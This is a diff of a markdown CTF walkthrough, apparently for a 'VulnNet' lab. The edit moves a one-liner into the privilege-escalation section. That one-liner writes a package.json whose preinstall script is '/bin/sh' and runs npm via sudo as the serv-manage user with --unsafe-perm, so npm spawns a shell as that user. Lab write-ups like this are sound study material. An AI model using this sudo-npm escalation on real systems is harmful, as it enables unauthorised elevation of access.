@@ -167,6 +167,12 @@ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
 chmod 777 -R $TF
 sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i
 ```
+
+It also works as a one-liner!! 
+```
+TF=$(mktemp -d); echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json; chmod 777 -R $TF; sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i
+```
+
 You should see somthing like this: 
 
 ![](/assets/images/vn_n/serv-manage.jpg)
@@ -195,11 +201,6 @@ This service appears to refer to another service `vulnnet-job.service` let's tak
 locate vulnnet-auto.timer.timer
 ls -lah /etc/systemd/system/vulnnet-job.service
 cat /etc/systemd/system/vulnnet-job.service
-```
-
-It also works as a one-liner!! 
-```
-TF=$(mktemp -d); echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json; chmod 777 -R $TF; sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i
 ```
 
 [](/assets/images/vn_n/job-service.jpg)
